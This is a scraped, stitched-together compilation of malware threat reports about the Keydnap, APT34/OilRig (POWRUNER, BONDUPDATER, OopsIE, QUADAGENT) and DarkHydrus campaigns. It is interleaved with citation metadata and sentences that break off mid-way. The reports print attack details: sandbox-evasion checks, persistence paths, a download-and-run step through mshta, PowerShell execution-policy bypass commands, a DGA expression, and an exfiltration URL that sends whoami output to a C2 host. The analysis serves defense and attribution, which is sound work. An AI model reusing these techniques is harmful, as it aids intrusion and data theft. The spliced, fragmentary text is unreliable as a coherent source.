by K Lee and H Koo One of the reasons we think the source was taken directly from Github is that the function names in the source code are the same in the Keydnap malware Figure 9: Function list of Keydnap backdoor The data field is encrypted with the RC4 key \u201cu2RLhh+!LGd9p8!ZtuKcN\u201d without quotes The function named get_and_execute_tasks handles 10 different command types The command with ID 8 must be sent while Keydnap isn\u2019t running as root already When issued, the backdoor will start monitoring the user\u2019s process count When two new processes are created within two seconds, Keydnap will spawn a window asking for the user\u2019s credentials, exactly like the one OS X users usually see when an application requires admin privileges If the victim falls for this and enters their credentials, the backdoor will henceforth run as root and the content of the victim\u2019s keychain will be exfiltrated Figure 12: Code performing the process count check Figure 13: icloudsyncd requesting privileges We do not know what the authd_service executable managed by command ID 9 is, because we haven\u2019t seen it used It could be a third stage malware deployed to certain targets of interest Conclusion There are a few missing pieces to this puzzle We do not know at this point how Keydnap is distributed Nor do we know how many victims there are out there Although there are multiple security mechanisms in place in OS X to mitigate malware, it\u2019s possible to deceive the user into executing non-sandboxed malicious code by replacing the icon of a Mach-O file IoCs Samples Downloader All downloaders listed below are detected as OSX/TrojanDownloader.Keydnap.A by ESET products

Exploit \u00ab New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit", "Retrieved May 07, 2019", "Article Content We assess this activity was carried out by a suspected Iranian cyber espionage threat group, whom we refer to as APT34, using a custom PowerShell backdoor to achieve its objectives We believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance efforts to benefit Iranian nation-state interests and has been operational since at least 2014 This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests APT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics We now attribute that campaign to APT34 In July 2017, we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware The backdoor was delivered via a malicious .rtf file that exploited CVE-2017-0199 The full report on APT34 is available to our\u00a0MySIGHT customer community.\u00a0APT34 loosely aligns with public reporting related to the group \"OilRig\" As individual organizations may track adversaries using varied data sets, it is possible that our classifications of activity may not wholly align The vulnerability was patched by Microsoft on Nov 14, 2017 A full proof of concept (POC) was publicly released a week later by the reporter of the vulnerability The vulnerability exists in the old Equation Editor (EQNEDT32.EXE), a component of Microsoft Office that is used to insert and evaluate mathematical formulas The Equation Editor is embedded in Office documents using object linking and embedding (OLE) technology If a crafted formula is passed to the Equation Editor, it does not check the data length properly while copying the data, which results in stack memory corruption As the EQNEDT32.exe is compiled using an older compiler and does not support address space layout randomization (ASLR), a technique that guards against the exploitation of memory corruption vulnerabilities, the attacker can easily alter the flow of program execution The malicious file exploits CVE-2017-11882, which corrupts the memory on the stack and then proceeds to push the malicious data to the stack The malware then overwrites the function address with the address of an existing instruction from EQNEDT32.EXE Figure 1: Disassembly of overwritten function address After exploitation, the \u2018WinExec\u2019 function is successfully called to create a child process, \u201cmshta.exe\u201d, in the context of current logged on user The process \u201cmshta.exe\u201d downloads a malicious script from hxxp://mumbai-m[.]site/b.txt and executes it, as seen in Figure 2 Figure 2: Attacker data copied to corrupt stack buffer Execution Workflow The malicious script goes through a series of steps to successfully execute and ultimately establish a connection to the command and control (C2) server The full sequence of events starting with the exploit document is illustrated in Figure 3 The malware overwrites the function address with an existing instruction from EQNEDT32.EXE The malware creates a child process, \u201cmshta.exe,\u201d which downloads a file from: hxxp://mumbai-m[.]site/b.txt b.txt contains a PowerShell command to download a dropper from: hxxp://dns-update[.]club/v.txt The PowerShell command also renames the downloaded file from v.txt to v.vbs and executes the script GoogleUpdateschecker.vbs is executed after sleeping for five seconds cUpdateCheckers.bat and *.base are deleted from the staging directory Figure 4 contains an excerpt of the v.vbs script pertaining to the Execution Workflow section POWRUNER is executed every minute by the Task Scheduler Figure 5 contains an excerpt of the POWRUNER backdoor Figure 5: POWRUNER PowerShell script hUpdateCheckers.ps1 POWRUNER begins by sending a random GET request to the C2 server and waits for a response The server will respond with either \u201cnot_now\u201d or a random 11-digit number If the response is a random number, POWRUNER will send another random GET request to the server and store the response in a string POWRUNER will then check the last digit of the stored random number response, interpret the value as a command, and perform an action based on that command The command values and the associated actions are described in Table 1 Figure 6 shows the PowerShell \u201cGet-Screenshot\u201d function sent by the C2 server Figure 6: Powershell Screenshot Functionality dUpdateCheckers.ps1 (BONDUPDATER) One of the recent advancements by APT34 is the use of DGA to generate subdomains DGA Implementation Figure 7 provides a breakdown of how an example domain (456341921300006B0C8B2CE9C9B007.mumbai-m[.]site) is generated using BONDUPDATER\u2019s custom DGA Figure 7: Breakdown of subdomain created by BONDUPDATER  This is a randomly generated number created using the following expression: $rnd = -join (Get-Random -InputObject (10..99) -Count (%{ Get-Random -InputObject (1..6)})); This value is either 0 or 1 It is initially set to 0 Initially set to 000, then incremented by 3 after every DNS request First 12 characters of system UUID \u201cB007\u201d hardcoded string BONDUPDATER will evaluate the last character of the file name and perform the corresponding action found in Table 2 Figure 8: Domain Generation Algorithm Some examples of the generated subdomains observed at time of execution include: 143610035BAF04425847B007.mumbai-m[.]site 835710065BAF04425847B007.mumbai-m[.]site 376110095BAF04425847B007.mumbai-m[.]site Network Communication Figure 9 shows example network communications between a POWRUNER backdoor client and server As the response is a random number that ends with \u20180\u2019, POWRUNER sends another random GET request to receive \u00a0an additional command string If the server had sent the string \u201cnot_now\u201d as response, as shown in Figure 10, POWRUNER would have ceased any further requests and terminated its execution Figure 10: Example \"not now\" server response Batch Commands POWRUNER may also receive batch commands from the C2 server to collect host information from the system An example batch command is provided in Figure 11 Figure 11: Batch commands sent by POWRUNER C2 server Additional Use of POWRUNER / BONDUPDATER APT34 has used POWRUNER and BONDUPDATER to target Middle East organizations as early as July 2017 In July 2017, a FireEye Web MPS appliance detected and blocked a request to retrieve and install an APT34 POWRUNER / BONDUPDATER downloader file During the same month, FireEye observed APT34 target a separate Middle East organization using a malicious .rtf file (MD5: 63D66D99E46FB93676A4F475A65566D8) that exploited CVE-2017-0199 The file also contains a comment by the malware author that appears to be an apparent taunt to security researchers Figure 12: Contents of dupdatechecker.doc script The dupatechecker.exe file (MD5: C9F16F0BE8C77F0170B9B6CE876ED7FB) drops both BONDUPDATER and POWRUNER These files connect to proxychecker[.]pro for C2 Outlook and Implications Recent activity by APT34 demonstrates that they are capable group with potential access to their own development resources We assess that APT34\u2019s efforts to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group\u2019s commitment to pursing strategies to deter detection We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to

Before carrying out any of its functionality the payload checks to see if it is executing in a sandbox Using WMI to check the BIOS manufacturer for XEN Using WMI to check if the total physical memory is less than 2900000000 Using WMI to check if the number of CPU cores is less than or equal to 1 If the payload determines it is not running in a sandbox, it will attempt to install itself to the system to persistently execute To persistently execute when the system starts, the script will create the following shortcut in the Windows startup folder, which will run the OneDrive.ps1 script each time the user logs in: $env:SystemDrive\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk The payload itself communicates with its configured command and control (C2) servers using a custom DNS tunneling protocol The domains configured within this payload are:  Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The DNS tunneling protocol can use multiple different DNS query types to interact with the C2 server To establish communications with the C2, the payload will first get a system specific identifier issued by the C2 server Table 1 explains how the payload obtains the system identifier from the C2 server\u2019s answer depending on the query type:    DNS Type Description   A Uses the regular expression \u2018(\\d+)\\-.$Global:domain\u2019 to get the decimal value from the answer   AAAA The payload will split the IPv6 answer on \u201c:\u201d take the [0] and [1] digits treat them as a hexadecimal value to obtain an integer The tunneling protocol transmits data by sending a series of DNS queries with the data within the subdomain of the C2 domain The C2 will provide a string that the payload will use to determine the command to execute based on its command handler We analyzed the payload to determine the commands available, which provide a variety of remote administration capabilities Thematically, each domain appeared to be attempting to spoof the legitimate domain of an existing technology provider with an emphasis on security vendors These IPs provided insufficient data for additional investigations However, each of the listed domains used ns102.kaspersky[.]host and ns103.kaspersky[.]host as their name servers Examination of ns102/ns103.kaspersky[.]host revealed that the second level domain kaspersky[.]host was illegitimate and not owned by the legitimate Kaspersky Labs Passive DNS resolution of kaspersky[.]host revealed two IPs of interest, 107.175.150[.]113 and 94.130.88[.]9 94.130.88[.]9 showed passive DNS resolutions of two additional domains, 0utlook[.]bid and hotmai1[.]com 107.175.150[.]113 showed one other domain resolution, <redacted>.0utl00k[.]net We were able to link this specific domain as a C2 for another weaponized document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) containing a PowerShell script very similar to the one found in this attack Examining the second level domain of 0utl00k[.]net revealed another IP of interest, 195.154.41[.]150 This IP contained two other domain resolutions following the vendor spoofing theme: allexa[.]net and cisc0[.]net Expanding upon cisc0[.]net, we discovered several weaponized documents and payloads using this domain as a C2, from mid to late 2017 Open source intelligence provided by ClearSky Security indicates the domain cisc0[.]net is possibly related to the adversary group known as Copy Kittens While there are significant tactical overlaps such as similarity of techniques used as well as victimology, we were unable to uncover significant evidence of relational overlaps Further information regarding the Copy Kittens adversary can be found in a paper titled Operation Wilted Tulip Our own dataset provides a solid grouping of the DarkHydrus group, with significant overlaps in C2 infrastructure as well as similarities in weaponized binaries C2 domains were also left online and reused over an extended amount of time, such as the domain micrrosoft[.]net which was used in this attack in addition to two other payloads in January 2017 and July 2017 Studying the other samples, we have attributed to DarkHydrus, we are able to ascertain that this adversary has mainly leveraged weaponized Microsoft Office documents using tools available freely or from open source repositories such as Meterpreter, Mimikatz, PowerShellEmpire, Veil, and CobaltStrike The documents generally do not contain malicious code and instead are weaponized to retrieve remote files containing malicious code on execution Due to the modular nature of the delivery document, available data for analysis for these attacks are dependent upon the operational nature of the C2 server at the time of execution Conclusion The DarkHydrus group carried out an attack campaign on at least one government agency in the Middle East using malicious .iqy files DarkHydrus leveraged this obscure file format to run a command to ultimately install a PowerShell scripts to gain backdoor access to the system The PowerShell backdoor delivered in this current attack may have been custom developed by the threat group, however, it is possible that DarkHydrus pieced together this tool by using code from legitimate open source tools Palo Alto Networks customers are protected by:  The micrrosoft[.]net domain has had a malicious classification

Evasion Techniques to OopsIE", "Retrieved May 07, 2019", "Article Content The OilRig group maintains their persistent attacks against government entities in the Middle East region using previously identified tools and tactics As observed in previous attack campaigns, the tools used are not an exact duplicate of the previous attack and instead is an iterative variant The attachment was identified as a variant of the OopsIE trojan we identified in February 2018 In this iteration of OopsIE, the general functionality largely remained the same but contained the addition of anti-analysis and anti-virtual machine capabilities to further evade detection from automated defensive systems Attack Details In July 2018, we reported on a wave of OilRig attacks delivering a tool called QUADAGENT involving a Middle Eastern government agency During that wave, we also observed OilRig leveraging additional compromised email accounts at the same government organization to send spear phishing emails delivering the OopsIE trojan as the payload instead of QUADAGENT The OopsIE attack also targeted a government agency within the same nation state, though a different organization than the one targeted delivering QUADAGENT The email subject was in Arabic, which translated to \u201cBusiness continuity management training\u201d The email was sent to an address belonging to a user group, rather than a specific individual\u2019s email address Based on open source data collection, it appears the targeted group had publicly published several documents regarding business continuity management on the Internet, indicating the lures were purposefully crafted for this specific attack Evasion Techniques The OopsIE variant delivered in this attack begins its execution by performing a series of anti-VM and sandbox checks If any of the checks described in Table 1 are successful, the Trojan will exit without running any of its functional code These evasion techniques are meant to thwart automated analysis in an effort to avoid detection Temperature Check The Trojan will perform the following WMI query: \u00a0 SELECT * FROM MSAcpi_ThermalZoneTemperature \u00a0 The Trojan will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported This is meant to find the result of Not supported, which is the result if run in a virtual machine Sandboxie DLL Check The Trojan will attempt to load the SbieDll.dll module via LoadLibrary VBox DLL Check The Trojan checks to see if the file vboxmrxnp.dll exists in the system directory Table 1 List of anti-vm and anti-sandbox techniques used by OopsIE \u00a0 Most of these evasion techniques have been observed in other malware families; however, a few of the techniques were more novel Figure 2 WMI query for Win32_Fan run on a physical system showing statistics Secondly, the CPU temperature check seen in this payload was previously used by GravityRAT, as discussed earlier this year by security researchers at Talos They noted that while virtual machines were detected by this technique, some physical systems were also detected as virtual machines because they did not support the WMI query The fact that the Trojan will not operate on systems that are not configured with these time zones suggests that this is a highly targeted attack focused on a specific subset of target nations Also, this version of the Trojan inspects HTTP responses from the C2 server for the tags <pre> and </pre> and will parse that data for commands However, there are many differences introduced to this version of OopsIE from the previously discussed variant The last check requires the user to click the \u2018Ok\u2019 button in an error dialog box, as seen in Figure 4 Figure 4 Error dialog box displayed by OopsIE After displaying the error dialog box, the Trojan will sleep for two seconds by running the following command that runs the choice application The use of the choice command, as seen below, did not appear in previous versions of OopsIE and appears to have been added in the most recent version used in this attack It then moves itself to %APPDATA%\\Windows\\WindowsImplantment.exe and sets both of these files to have the hidden and system flags to hide them from the user The %path% string in the scheduled task command will be replaced with the path to the following: %APPDATA%\\Windows\\ShwDoc.VBS The decoded string from the VBS resource is written to ShwDoc.VBS The %app% string in the VBScript is replaced with %APPDATA%\\Windows\\WindowsImplantment.exe The process in which the Trojan communicates with its C2 server is very similar to the previous OopsIE Trojan that we discussed in our previous blog This particular sample uses the following domain as its C2 server: www.windowspatch[.]com One obvious difference between this version of OopsIE compared to the previously analyzed version is the strings in the C2 URLs are reversed, from chk to khc, what to tahw and resp to pser Also, the oops string used to signify and erroneous transmission from the C2, which gave OopsIE its name is reversed to spoo The command handler in this OopsIE variant is very similar to the previous version, as it contains the same three (1, 2 and 3) commands seen in Table 2 The one difference in this command handler from the previous version is the boom! command, which allows the actor to uninstall the OopsIE Trojan from the system Command Description   1 Runs a supplied command and writes it output to %APPDATA%\\SchWin.vbs, which will then be uploaded to the C2 server Splits argument on \u201c(|)\u201d, with the string to the left representing the filename to save and the string to the right representing the data to write to the file 3 Read specified file and uploads its contents to the C2 server Table 2 OopsIE commands When sending data to the C2 server after running commands, the Trojan will use the following URL structure with either BBY or BBZ splitting the whoami output and the exfiltrated data: http://www.windowspatch.com/pser?<hex(STDOUT of whoami command)(BBZ|BBY)hex(up to 1000 bytes of hexadecimal data)> \u00a0 Conclusion The OilRig group remains a persistent adversary in the Middle East region They continue to iterate and add capabilities to their tools while still functionally using the same tactics over and over again Within the time frame we have been tracking the OilRig group, they have repeatedly shown a willingness to add less commonly found functionality to their tools, such as their heavy use of DNS tunneling in their backdoors or adding authentication to their webshells This attack is no different, now adding anti-analysis capabilities into their tools This adversary is highly resourceful and continues to adapt over time However, the tactics they continue to deploy are generally unsophisticated, and simple security hygiene would help organizations protect themselves against this threat ", "Bryan Lee", "April 03, 2019", "OilRig Targets Technology Service Provider and Government Agency with QUADAGENT", "Retrieved May 07,

their tactics and bolster their toolset with newly developed tools The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region We first discovered this group in mid-2016, although it is possible their operations extends earlier than that time frame They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down Examining their past behaviors with current events only seems to indicate that the OilRig group\u2019s operations are likely to accelerate even further in the near future Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks The targets in these attacks included a technology services provider as well as another government entity Both these targets were in the same nation-state Further, the attacks against these targets were made to appear to have originated from other entities in the same country However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as well The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented However, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently Detailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog QUADAGENT is the 12th custom built tool that Unit 42 has documented the OilRig group using for their attacks Our analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other Primarily, one used a Microsoft .NET Framework-based dropper that also opens a decoy dialog box, which can be seen in Figure 1 The other sample was a PE file generated via a bat2exe tool QUADAGENT PE Files The QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only differences being the command and control server (C2) and randomized obfuscation We were also able to locate a third delivery package of the QUADAGENT backdoor as reported by ClearSky Cyber Security In their example, the OilRig group used a malicious macro document to deliver the backdoor, which is a tactic much more commonly used by them Invoke-Obfuscation has proven to be highly effective at obfuscating PowerShell scripts and in this case, the adversary was able to take advantage of the tool for increased chances of evasion and as an anti-analysis tactic Attack Details This latest attack consisted of three waves between May and June 2018 All three waves involved a single spear phishing email that appeared to originate from a government agency based in the Middle East Based on our telemetry, we have high confidence the email account used to launch this attack was compromised by the OilRig group, likely via credential theft In the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were not easily discoverable via common search engines, indicating the targets were likely part of a previously collected target list, or possibly known associates of the compromised account used to send the attack emails The malicious attachment was a simple PE file (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63) with the filename <redacted> Technical Services.exe Its sole purpose here is to install the QUADAGENT backdoor and execute it This PE was slightly different from the other attack, being compiled using the Microsoft .NET Framework instead of being generated via a bat2exe tool and containing a decoy dialog box as shown in Figure 1 Figure 1 Decoy dialog box The tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a method to reduce suspicion by the victim In comparison to being silently run, a victim may be less suspicious of a dialog/error message because they are provided what appears to be a legitimate error response when attempting to open the attachment When a file is silently run, because there is no response to the user\u2019s action, a victim may be more suspicious or curious on what actually happened The C2 techniques remained identical, with the only change being the server which became cpuproc[.]com Using rdppath[.]com as a pivot point, we collected an additional QUADAGENT sample also communicating to this C2 (SHA256: d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de), which was first reported by ClearSky Cyber Security The use of malicious macro delivery documents is a tactic we have observed the OilRig group use repeatedly over the three years we\u2019ve been tracking them The actual QUADAGENT script payload used in the ClearSky sample was exactly the same as the one we found in the bat2exe version used against the aforementioned technical services provider The delivery document also used a filename that could be related to other technology services or media organizations within that same nation state, although it is inconclusive Unlike many other delivery documents used by this group, there was no additional decoy content after the macro was enabled Figure 2 Lure image used to entice users to enable macros Use of Open Source Tools In an attempt to avoid detection and as an anti-analysis tactic, the OilRig group abused an open source tool called Invoke-Obfuscation to obfuscate the code used for QUADAGENT Invoke-Obfuscation is freely available via a Github repository and allows a user to change the visual representation of a PowerShell script simply by selecting the desired obfuscation techniques Invoke-Obfuscation offers a variety of obfuscation techniques, and by analyzing the script we were able to ascertain the specific options in this attack After identifying the specific options used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform additional analysis \u201c{1}{0}\u201d -f \u2018bar\u2019,\u2019foo\u2019) During our analysis, we installed Invoke-Obfuscation and used it to obfuscate a previously collected QUADAGENT sample to confirm our analysis.\u00a0 We used the two previously mentioned obfuscation options within Invoke-Obfuscation on this QUADAGENT sample, which resulted in the generation of a very similar script as the Office365DCOMCheck.ps1 and SystemDiskClean.ps1 payloads delivered in the attacks discussed in this blog We captured the commands we ran in Invoke-Obfuscation in the animation in Figure 3 below, which visualizes the steps the threat actor may have taken to create the payload delivered in this attack Figure 3 Possible steps carried out in Invoke-Obfuscation on the QUADAGENT sample Conclusion The OilRig group continues to be a persistent adversary group in the Middle East region While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished Palo Alto Networks customers may learn more and are protected via the following ways:  WildFire classifies QUADAGENT samples as malicious

document (SHA256: 1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c) that contained an at-the-time an unknown payload which would be revealed to be QUADAGENT While we do not have data supporting targeting information or telemetry, we know the document was created in January 2018 and likely used in an attack around that time frame In addition, the delivery document shared metadata artifacts with the ThreeDollars delivery document (SHA256: 119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc) that OilRig used to deliver the ISMAgent payload in a targeted attack In January 2018 on a government entity in the Middle East The QUADAGENT payload dropped by the delivery document had the filename AdobeAcrobatLicenseVerify.ps1 and used acrobatverify[.]com for its C2 Examining the subdomains for acrobatverify[.]com reveals three subdomains, www, resolve, and dns The passive DNS data for the subdomains shows an IP resolution of 185.162.235[.]121 from December 2017 through January 2018 Prior to this time period, we see several subdomains of msoffice-cdn[.]com, ns1, ns2, and www also resolving to this IP This IP and msoffice-cdn[.]com were both previously referenced in our first report on an OilRig attack using the ThreeDollars delivery document We used this QUADAGENT payload when testing the Invoke-Obfuscation tool mentioned in this blog QUADAGENT Analysis The final payload delivered in all three attack waves is a PowerShell downloader referred to by other research organizations as QUADAGENT The downloaders in these attacks were configured to use both rdppath[.]com and cpuproc[.]com as their C2 servers We provide more on the specific usage of these protocols as we discuss the inner workings of this malware in this section The downloader will use the filename of the script (ex The task itself is fairly simple, calling the VBScript file which contains a PowerShell one-liner as an argument to run the QUADAGENT payload (ex Office365DCOMCheck or SystemDiskClean), such as the following: \u00a0 HKCU\\Office365DCOMCheck \u00a0 The payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the C2 server This registry key is empty upon the first execution of the payload To trigger this, if the HTTPS requests do not work, the payload attempts to cause an exception by dividing 1 by 0 If either attempt is successful, the C2 server will respond with the session ID and a pre-shared key in cleartext, which it will save to the previously mentioned registry key To obtain the session ID and pre-shared key, the payload will issue a query to resolve the following domain: \u00a0 mail.<random number between 100000 and 999999>.<c2 name> \u00a0 This request notifies the C2 server that the payload is about to send system specific data as part of the initial handshake The payload will issue a DNS query to the following domain to notify the C2 that it is about to send it data (session ID value) to it in a subsequent query: \u00a0 ns1.<random number between 100000 and 999999>.<c2 name> The payload does nothing with the C2 server\u2019s response to the query The type field specifies the command that the payload will handle This specific variant of the payload can only handle one command type, x The batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command:       @shift /0rename Out.jpg Office365DCOMCheck.ps1PowerShell -exec bypass -File

previously shown and discussed with the following command:       Interaction.MsgBox(\"An error occurred while processing your request It will then execute it as a shell object:       cmd.exe /c powershell -exec bypass -file \"C:\\Users\\Administrator\\AppData\\Local\\Temp\\SystemDiskClean.ps1\"     In the malicious macro attack, the same Office365DCOMCheck.ps1 script that was used in the PE version is used as the payload When the document is opened, a lure image as shown as seen in Figure 2 is displayed in an attempt to coerce the victim to enable macros The creator of the delivery document was able to visually hide the PowerShell script in the header by setting the text to a font size of 2 and font color of white, as seen in Figure 4 Figure 4 Hidden PowerShell script within the

On January 8, 2018, Unit 42 observed the OilRig threat group carry out an attack on an insurance agency based in the Middle East Just over a week later, on January 16, 2018, we observed an attack on a Middle Eastern financial institution In both attacks, the OilRig group attempted to deliver a new Trojan that we are tracking as OopsIE The January 8 attack used a variant of the ThreeDollars delivery document, which we identified as part of the OilRig toolset based on attacks that occurred in August 2017 However, the attack on January 16 did not involve ThreeDollars at all Instead, this attack involved delivering the OopsIE Trojan directly to the victim, most likely using a link in a spear phishing email Interestingly, the targeted organization in the January 16 attack had already been targeted by the OilRig group a year ago on January 2017 This repeat attack may suggest that the adversaries have lost their foothold in the targeted organization, or that it may be considered a high value target A New Attack On January 8, 2018, the OilRig threat group sent an email with the subject Beirut Insurance Seminar Invitation to an insurance agency in the Middle East The OilRig group sent two emails to two different email addresses at the same organization within a six minutes time span The recipient email addresses suggest they may be the addresses used for specific regional branches of the targeted organization Both emails originated from the same address However, based upon the captured session data, it is highly likely the source email address was spoofed Examining this sample of ThreeDollars reveals that it contains a new payload, which we have named OopsIE In the January 16, 2018 attack, we observed OilRig attacking an organization it previously targeted in January 2017 In this case, the ThreeDollars delivery document was not used and instead an attempt was made to deliver the OopsIE Trojan directly to the targeted organization, likely via a link within an email The Trojan was directly downloaded from the command and control server for OopsIE, signifying that this server was also used for staging This suggests that due to the January 2017 attack, the targeted organization may have taken actions to counter known OilRig TTPs, in this case delivering malicious macro documents, causing the OilRig operators to adopt a different delivery tactic We also identified another sample of ThreeDollars, created on January 15, 2017 with the file name strategy preparation.dot While this sample was very similar to the Seminar-Invitation.doc sample it also had some significant differences While this is not a new tactic, this is the first instance where we have observed the OilRig using it in their playbook Typically, password protected documents is commonly used by adversaries as an evasion tactic to bypass automated analysis mechanisms due to the password requirement for successful execution As we have observed throughout our tracking of the OilRig group, adopting proven tactics has been a common behavior over time ThreeDollars Document Analysis The samples of ThreeDollars we collected in these attacks are structurally very similar to the first sample we analyzed in October 2017, down to the lure image used to trick the recipient into clicking the \u201cEnable Content\u201d button to execute the malicious macro The images used in the January 2018 attacks were the exact same in each sample, verified by file hash Figure 1 shows the lure image extracted from the newer attacks, and the lure image from the first sample we analyzed While it is unsurprising that attacks originating from the same adversary group would use the same resource over time, we analyzed exactly how similar these lure images were The image from the August 2017 attack for example, is significantly larger, using an image resolution of 3508 pixels x 4961 pixels which is also the exact resolution for a sheet of A3 paper at 300 dpi It also contains some additional artifacts in the image, such as the inclusion of the Microsoft logo as well as additional text, specifically \u201cagainst unauthorized use\u201d In comparison, the newer lure image appears to be horizontally distorted due to it being resized to fit into the constraints of the document In addition, the period after \u201cThis document is protected\u201d is misaligned By overlaying these two lure images and accounting for the newer image\u2019s distortion, we are able to clearly visualize that the newer image is highly likely to be a cropped and edited version of the August 2017 image Examining the color code used in both images also shows they are the exact same, #da3b01 The dimensions of the newer image are roughly 40% of the older October image, suggesting that after cropping and editing the newer image, the creator is also likely to have resized the image One peculiar artifact from the original image is the usage of the \u201cst\u201d (unicode \\uFB06) ligature in the word \u201cagainst\u201d This is a highly uncommon glyph and is not generally available in standard keyboard layouts This may suggest that the string was machine generated rather than directly inputted from a keyboard The use of this glyph also may suggest that the actor is not a native English speaker When button is clicked, a malicious macro is silently run which installs then executes a payload on a system A decoy image is also displayed to the victim to lower suspicion of malicious activity The decoy message that is eventually presented to the victim does not actually show the expected content of an insurance seminar invitation as presented in the delivery email Instead, it displays a fake error message of NullRefrencedException! error has occurred in user32.dll by 0x32ef2121 within the Word document, as seen in Figure 2 Figure 2 Decoy message displayed by the malicious macro in ThreeDollars delivery document \u00a0 While the decoy in Figure 2 is displayed, the macro will search the document for the delimiter ###$$$ and write the base64 encoded text that follows this delimiter to the file %APPDATA%\\Base.txt The macro then creates a scheduled task named SecurityAssist that runs after waiting one minute The Trojan extracts and loads this embedded assembly by concatenating the contents of two resources named S1 and S2 and decompresses the resulting data using the GZipSteam class The concatenation of resources to construct embedded assemblies is not a new technique for the OilRig group, as they used the very same technique in October 2017 in their ISMInjector tool to construct its embedded libraries Joiner.dll and Inner.dll By using the InternetExplorer application object, all C2 related requests will look as if they came from the legitimate browser and therefore will not contain any anomalous fields within the request, such as custom User-Agents The initial HTTP request acts as a beacon, as shown in the image below The C2 server will respond to the Trojan\u2019s request by echoing the value <hex(Environment.UserName/Environment.MachineName)> if it wishes to provide additional commands If the C2 server does not respond with the appropriate echoed data, the Trojan will create a file named srvCheckresponded.tmp in the SpecialFolder.CommonApplicationData folder and write nothing to it before exiting For instance, the character A would be represented by the two characters 41, which is the hexadecimal representation of that character This hexadecimal format is used extensively throughout this Trojan The parameters supplied to this command include hexadecimal values for the binary data and the filename, which are split up by a delimiter of (!) This type of commonality is unsurprising as we are assuming a single adversary, and is an excellent example of how adversaries will often times reuse certain tactics and techniques whether it is for efficiencies sake or sheer laziness In the attacks described above, we observed a new payload being delivered using a previously unknown command and control domain However, as we continued to follow the trail of evidence, we found immediate links to past attacks and common artifacts from the OilRig group The most obvious link is the reuse of the ThreeDollars delivery document, which we had previously observed delivering a different payload However, we also found other connection to other OilRig group attacks starting with the command and control domain, msoffice365cdn[.]com Beginning with the WHOIS record, we see that the domain was registered by emilia.jones@mail.ru Examining additional domains registered to this email address reveals the domain office365-management[.]com, which we previously identified in October 2017 to be an OilRig C2 Continuing to examine the WHOIS records, we see that a fairly unique phone number is also used in the record It is only found in one other WHOIS record, for the domain office365-technical[.]info, which is registered to leonard.horner@mail.ru Based off the relational links and thematic similarity of the domain name, we have strong reason to believe this domain and registrant are also attributed to the OilRig group Moving onto IP resolutions of the identified domains proves to be fruitful as well In addition, we find that 80.82.79.221 shares an SSL certificate with a small number of other IP addresses, one of which is 185.162.235.29 This IP resolves to office365-management[.]com which was one of the domains registered by the emilia.jones@mail.ru entity Lastly, we examine the delivery document itself Although we have already identified the documents as a variant of the ThreeDollars tool and analyzed the lure image used in this document in comparison to the previously used lure image, additional artifacts also exist to further strengthen the relational link of this sample and the attack to previous OilRig attributed tools and attacks In this case, one of the ThreeDollars samples we collected contained a unique author name of J-Win-7-32-Vm We had previously observed this author name in use once before, in the very first ThreeDollars document we collected that we had reported on in August 2017 Conclusion The OilRig group continues to remain a highly active adversary in the Middle East region This group has repeatedly shown evidence of a willingness to adapt and evolve their tactics, while also reusing certain aspects as well We have now observed this adversary deploy a multitude of tools, with each appearing to be some form of iterative variation of something used in the past However, although the tools themselves have morphed over time, the plays they have executed in their playbook largely remain the same when examined over the attack life cycle We have added this play to the OilRig playbook, which can be viewed online via our Playbook Viewer Palo Alto Networks customers are protected

